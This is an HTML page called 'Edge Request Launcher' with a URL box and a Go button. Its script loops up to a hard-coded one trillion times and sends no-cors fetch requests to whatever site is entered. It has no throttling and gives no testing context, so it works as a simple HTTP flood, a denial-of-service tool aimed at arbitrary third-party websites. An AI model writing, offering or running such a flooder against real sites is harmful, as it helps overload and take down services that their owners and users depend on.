<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Edge Request Launcher</title>
  <style>
    body {
      background: #111;
      color: #eee;
      font-family: Consolas, monospace;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    input {
      width: 400px;
      padding: 8px;
      font-size: 14px;
      margin-bottom: 10px;
    }
    button {
      padding: 8px 16px;
      font-size: 14px;
      cursor: pointer;
    }
    #status {
      margin-top: 20px;
      font-size: 13px;
      color: #7cfc00;
    }
  </style>
</head>
<body>
  <h2>Request a Website</h2>
  <input id="urlInput" type="text" placeholder="Enter full URL (https://...)">
  <button onclick="sendRequests()">Go</button>
  <div id="status"></div>

  <script>
    // ðŸ”§ Hard-coded knob: change this number directly in the code
    const REQUEST_COUNT = 1000000000000; // modify this constant to control how many requests are sent

    function sendRequests() {
      const url = document.getElementById('urlInput').value.trim();
      if (!url) {
        document.getElementById('status').textContent = "Please enter a URL.";
        return;
      }

      let sent = 0;
      for (let i = 0; i < REQUEST_COUNT; i++) {
        fetch(url, { mode: 'no-cors' })
          .then(() => {
            sent++;
            document.getElementById('status').textContent =
              `Sent ${sent}/${REQUEST_COUNT} requests to ${url}`;
          })
          .catch(err => {
            document.getElementById('status').textContent = "Error: " + err;
          });
      }
    }
  </script>
</body>
</html>
